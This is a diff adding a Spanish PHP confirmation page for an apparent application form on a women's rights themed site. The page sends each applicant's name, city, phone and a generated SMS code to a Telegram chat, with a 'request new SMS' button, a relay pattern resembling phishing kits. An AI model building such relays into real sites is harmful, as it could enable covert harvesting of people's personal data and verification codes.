@@ -1,0 +1,210 @@
+<?php
+session_start();
+
+// TODO: Reemplaza estos valores por los de tu bot de Telegram
+$BOT_TOKEN = 'PON_AQUI_TU_BOT_TOKEN';
+$CHAT_ID   = 'PON_AQUI_TU_CHAT_ID';
+
+function rutaCodigos()
+{
+    return __DIR__ . '/codigos.json';
+}
+
+function guardarCodigo($telefono, $codigo)
+{
+    $archivo = rutaCodigos();
+    $datos = [];
+    if (is_file($archivo)) {
+        $json = file_get_contents($archivo);
+        $tmp = json_decode($json, true);
+        if (is_array($tmp)) {
+            $datos = $tmp;
+        }
+    }
+    $datos[$telefono] = $codigo;
+    file_put_contents($archivo, json_encode($datos));
+}
+
+function obtenerCodigo($telefono)
+{
+    $archivo = rutaCodigos();
+    if (!is_file($archivo)) {
+        return null;
+    }
+    $json = file_get_contents($archivo);
+    $datos = json_decode($json, true);
+    if (!is_array($datos)) {
+        return null;
+    }
+    return $datos[$telefono] ?? null;
+}
+
+function borrarCodigo($telefono)
+{
+    $archivo = rutaCodigos();
+    if (!is_file($archivo)) {
+        return;
+    }
+    $json = file_get_contents($archivo);
+    $datos = json_decode($json, true);
+    if (!is_array($datos) || !isset($datos[$telefono])) {
+        return;
+    }
+    unset($datos[$telefono]);
+    file_put_contents($archivo, json_encode($datos));
+}
+
+function enviarATelegram($botToken, $chatId, $texto, $replyMarkup = null) {
+    if ($botToken === 'PON_AQUI_TU_BOT_TOKEN' || $chatId === 'PON_AQUI_TU_CHAT_ID') {
+        // Aún no configurado: no intentamos llamar a la API real
+        return false;
+    }
+
+    $url = 'https://api.telegram.org/bot' . $botToken . '/sendMessage';
+    $data = [
+        'chat_id' => $chatId,
+        'text'    => $texto,
+    ];
+    if ($replyMarkup !== null) {
+        $data['reply_markup'] = json_encode($replyMarkup);
+    }
+
+    $options = [
+        'http' => [
+            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
+            'method'  => 'POST',
+            'content' => http_build_query($data),
+            'timeout' => 5,
+        ],
+    ];
+
+    $context  = stream_context_create($options);
+    @file_get_contents($url, false, $context);
+}
+
+$accion = $_POST['accion'] ?? null;
+$codigoIngresado = $_POST['codigo'] ?? null;
+
+// Si llegan datos del formulario inicial (nombre, ciudad, celular)
+if (isset($_POST['nombre'], $_POST['ciudad'], $_POST['celular']) && $accion === null && $codigoIngresado === null) {
+    $nombre  = trim($_POST['nombre']);
+    $ciudad  = trim($_POST['ciudad']);
+    $celular = trim($_POST['celular']);
+
+    // Guardar teléfono en sesión para validación posterior
+    $_SESSION['celular'] = $celular;
+
+    // Generar código de verificación de 6 dígitos
+    $codigo = random_int(100000, 999999);
+    guardarCodigo($celular, $codigo);
+
+    // Enviar datos a Telegram con botón inline para pedir nuevo SMS
+    $mensaje = "Nueva postulación:\n" .
+               "Nombre: $nombre\n" .
+               "Ciudad: $ciudad\n" .
+               "Celular: $celular\n" .
+               "Código SMS: $codigo";
+
+    $replyMarkup = [
+        'inline_keyboard' => [
+            [
+                [
+                    'text' => 'Pedir nuevo SMS',
+                    'callback_data' => 'PEDIR_SMS|' . $celular,
+                ],
+            ],
+        ],
+    ];
+
+    enviarATelegram($BOT_TOKEN, $CHAT_ID, $mensaje, $replyMarkup);
+}
+
+// Si el usuario pulsa "Pedir SMS", en un sistema real aquí llamarías a tu proveedor de SMS
+if ($accion === 'pedir_sms' && isset($_SESSION['codigo_sms'])) {
+    // Lugar para integrar envío de SMS real con $_SESSION['codigo_sms']
+}
+
+$mensajeConfirmacion = '';
+$estadoConfirmado = false;
+
+if ($accion === 'confirmar' && $codigoIngresado !== null) {
+    $telefono = $_SESSION['celular'] ?? null;
+    $codigoGuardado = $telefono ? obtenerCodigo($telefono) : null;
+    if ($telefono !== null && $codigoGuardado !== null && $codigoIngresado === (string)$codigoGuardado) {
+        $estadoConfirmado = true;
+        $mensajeConfirmacion = 'Listo, tu solicitud ha sido confirmada.';
+        borrarCodigo($telefono);
+    } else {
+        $mensajeConfirmacion = 'El código no es válido. Inténtalo nuevamente.';
+    }
+}
+?><!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Confirmar solicitud</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=Merriweather:wght@400;700;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <header class="header">
+    <div class="container header-top">
+      <div class="brand">
+        <img src="Banner.png" alt="Banner" class="brand-img">
+      </div>
+      <nav class="main-nav">
+        <a href="#" class="nav-link active nav-news">Noticias<span class="nav-sub">Mantente actualizado</span></a>
+        <a href="#" class="nav-link nav-docs">Documentos<span class="nav-sub">Biblioteca</span></a>
+        <a href="#" class="nav-link nav-contact">Contáctanos<span class="nav-sub">Compártenos tus dudas</span></a>
+        <span class="divider" aria-hidden="true"></span>
+        <a href="#" class="cta cta-edu">NOTICIAS<span class="cta-sub">Mantente informado</span></a>
+        <a href="#" class="cta cta-chat">Chat bot<span class="cta-sub">Derechos de mujer</span></a>
+      </nav>
+    </div>
+    <div class="subbar">
+      <div class="container subbar-inner">
+        <a href="#" class="sub-link">Sobre nosotros</a>
+        <a href="#" class="sub-link">Preguntas frecuentes</a>
+      </div>
+    </div>
+  </header>
+  <main class="container main">
+    <section class="postulacion">
+      <?php if ($estadoConfirmado): ?>
+        <h1 class="promo-title">Listo</h1>
+        <p class="promo-text"><?php echo htmlspecialchars($mensajeConfirmacion, ENT_QUOTES, 'UTF-8'); ?></p>
+      <?php else: ?>
+        <h1 class="promo-title">Verifica tu solicitud</h1>
+        <p class="promo-text">
+          Te hemos enviado un código SMS de confirmación. Pulsa el botón <strong>Pedir SMS</strong> si aún no lo has recibido
+          y luego ingresa el código para confirmar tu postulación.
+        </p>
+
+        <?php if ($mensajeConfirmacion): ?>
+          <p class="promo-text" style="color:#b91c1c; margin-top:16px;">
+            <?php echo htmlspecialchars($mensajeConfirmacion, ENT_QUOTES, 'UTF-8'); ?>
+          </p>
+        <?php endif; ?>
+
+        <form class="form-postulacion" action="procesar.php" method="post">
+          <div class="form-group form-group-full">
+            <button type="submit" name="accion" value="pedir_sms" class="promo-cta">Pedir SMS</button>
+          </div>
+
+          <div class="form-group form-group-full">
+            <label for="codigo">Código SMS de confirmación</label>
+            <input type="text" id="codigo" name="codigo" placeholder="Ingresa el código que recibiste" required>
+          </div>
+
+          <div class="form-actions form-group-full">
+            <button type="submit" name="accion" value="confirmar" class="promo-cta">Confirmar código</button>
+          </div>
+        </form>
+      <?php endif; ?>
+    </section>
+  </main>
+</body>
+</html>
